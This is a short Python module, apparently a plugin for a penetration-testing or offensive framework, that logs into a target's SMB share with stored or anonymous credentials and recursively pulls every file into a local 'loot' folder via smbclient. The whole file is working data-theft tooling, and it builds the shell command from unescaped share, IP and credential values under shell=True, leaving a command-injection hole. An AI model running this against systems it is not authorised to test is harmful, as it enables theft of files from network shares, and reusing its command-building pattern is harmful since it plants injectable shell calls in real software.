import subprocess
import os
from pathlib import Path

def run(data, cred, args):
    # 1. Resolve Share (Positional or --share)
    share = getattr(args, "share", None)
    if not share and getattr(args, "extra", []):
        share = args.extra[0]

    if not share:
        print("[!] Share name required")
        return

    ip = data.get("ip")
    # Define where the loot goes (Artifacts folder)
    loot_dir = Path(f"./artifacts/{data.get('name', 'default')}/smb/{share}")
    loot_dir.mkdir(parents=True, exist_ok=True)

    # 2. Setup Auth
    if cred:
        user = cred.get("user")
        password = cred.get("secret")
        auth = f"-U {user}%{password}"
    else:
        print("[*] No credentials set, attempting anonymous download...")
        auth = "-N"

    # 3. The Command (Your logic integrated)
    # prompt OFF: don't ask for confirmation
    # recurse ON: go into subdirectories
    # lcd: change local directory to our loot folder
    # mget *: get everything
    smb_cmd = f"prompt OFF; recurse ON; lcd {loot_dir}; mget *"
    cmd = f"smbclient //{ip}/'{share}' {auth} -c '{smb_cmd}'"

    print(f"[*] Target: //{ip}/{share}")
    print(f"[*] Destination: {loot_dir}")
    print(f"[*] Running: {cmd}\n")

    try:
        # We run this with shell=True to handle the complex quoting
        subprocess.run(cmd, shell=True)
        print(f"\n[+] Download complete. Files saved to: {loot_dir}")
    except KeyboardInterrupt:
        print("\n[!] Download interrupted by user.")